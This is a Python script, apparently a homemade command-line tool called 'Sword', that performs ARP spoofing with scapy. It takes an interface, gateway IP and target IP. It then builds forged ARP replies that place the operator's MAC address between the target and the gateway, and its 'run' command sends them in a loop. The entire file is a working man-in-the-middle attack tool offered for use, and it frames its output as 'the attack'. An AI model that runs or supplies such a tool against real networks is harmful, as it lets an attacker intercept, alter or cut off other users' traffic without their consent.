#!/usr/bin/python
# -*- coding: utf-8 -*-
#Auther: Kiyotaka
#Time: 2021/5/24

from scapy.all import *
import time
import sys
import os
    
pkt1 = Ether()/ARP(op=2)
pkt2 = Ether()/ARP(op=2)
tIP = "0.0.0.0"
gIP = "0.0.0.0"

def title():
    path = sys.argv[0]
    text = '''\033[1;35m
                                                    _
                          _____      _____  _ __ __| |      | Ver: 0.001
                         / __\ \ /\ / / _ \| '__/ _` |      | Auther: Kiyotaka
                         \__ \\\\ V  V / (_) | | | (_| |      | {}
                         |___/ \_/\_/ \___/|_|  \__,_|      |
    \033[0m'''.format(path)
    print(text)

#程序主体
def body(command):

    #打印帮助信息
    if command == "help":
        print("\n\033[1;31mset\033[0m -- set argv(gatewayIP/targetIP/inter) 'IP'/'inter'\n")
        print("\033[1;31mrun\033[0m -- start arp_spoof\n")
        print("\033[1;31mshow options\033[0m -- show options\n")
        print("\033[1;31mhelp\033[0m -- list of all commands\n")
        print("\033[1;31mexit\033[0m -- exit\n")
    
    elif command.split(" ")[0] == "set" and command.split("t")[1][0] == ' ':

        if command.split(" ")[1] == "inter" and command.split(" ")[1].split("r")[1][0] == ' ':
            
            if len(command.split(" ")[2]) == 0:
                print("\n\033[1;31mError!!!\033[0m\n")
                print("Enter '\033[1;31mhelp\033[0m' for help\n")

            else:
                inter = command.split(" ")[2]
                src_mac = get_if_hwaddr(inter)
                pkt1.src = src_mac
                pkt1.hwsrc = src_mac

                pkt2.src = src_mac
                pkt2.hwsrc = src_mac

                print("\033[1;32m[+]\033[0m interface => {}".format(inter))
                print("\033[1;32m[+]\033[0m local_mac => {}".format(src_mac))
        
        elif command.split(" ")[1] == "gatewayIP" and command.split(" ")[1].split("P")[1][0] == ' ':
            if len(command.split(" ")[2]) ==0:
                print("\n\033[1;31mError!!!\033[0m\n")
                print("Enter '\033[1;31mhelp\033[0m' for help\n")
            
            else:
                gIP = command.split(" ")[2]
                gat_mac = getmacbyip(gIP)
                
                pkt1.psrc = gIP
                pkt2.pdst = gIP
                
                pkt2.dst = gat_mac
                
                print("\033[1;32m[+]\033[0m gatewayIP => {}".format(gIP))
        
        elif command.split(" ")[1] == "targetIP" and command.split(" ")[1].split("P")[1][0] == ' ':
            if len(command.split(" ")[2]) ==0:
                print("\n\033[1;31mError!!!\033[0m\n")
                print("Enter '\033[1;31mhelp\033[0m' for help\n")

            else:
                tIP = command.split(" ")[2]
                tgt_mac = getmacbyip(tIP)
                pkt1.dst = tgt_mac
                pkt1.hwdst = tgt_mac
                
                pkt1.pdst = tIP
                pkt2.psrc = tIP
                print("\033[1;32m[+]\033[0m targetIP => {}".format(tIP))

        else:
            print("\n\033[1;31mError!!!\033[0m\n")
            print("Enter '\033[1;31mhelp\033[0m' for help\n")

    elif command == "show options":
        
        print("\033[1;35m[*]\033[0m pkt1:\n")
        print("+---------------------------+")
        print("+----=[\033[1;33mSend to gateway\033[0m]=----+")
        print("+---------------------------+")
        print("local_mac & target_IP: \033[1;33m{0}\033[0m | \033[1;33m{1}\033[0m".format(pkt2[Ether].src, pkt2[ARP].psrc))
        print("gateway_mac & gateway_IP: \033[1;33m{0}\033[0m | \033[1;33m{1}\033[0m".format(pkt2[Ether].dst, pkt2[ARP].pdst))
        print("op: \033[1;33m{}\033[0m".format(pkt1[ARP].op))
        
        print("\n\033[1;35m[*]\033[0m pkt2:\n")
        print("+---------------------------+")
        print("+----=[\033[1;33mSend to target\033[0m]=-----+")
        print("+---------------------------+")
        print("local_mac & gateway_IP: \033[1;33m{0}\033[0m | \033[1;33m{1}\033[0m".format(pkt1[Ether].src, pkt1[ARP].psrc))
        print("target_mac & target_IP: \033[1;33m{0}\033[0m | \033[1;33m{1}\033[0m".format(pkt1[Ether].dst, pkt1[ARP].pdst))
        print("op: \033[1;33m{}\033[0m".format(pkt2[ARP].op))

    elif command == "run":

        for i in range(int(input("\n\033[1;31mtimes>>> \033[0m")) + 1):
            sendp(pkt1)
            sendp(pkt2)
            time.sleep(0.1)

        os.system("clear")
        print("\033[1;35m[*]\033[0mThe attack is over.")
            
    
    else:
        print("\n\033[1;31mError!!!\033[0m\n")
        print("Enter '\033[1;31mhelp\033[0m' for help\n")

def main():
    os.system("clear")
    title()

    while True:
        com = str(input("\n\033[1;35mSword>>> \033[0m"))
        if com == "exit":
          sys.exit(1)
        
        else:
           body(com)

if __name__ == '__main__':
    main()
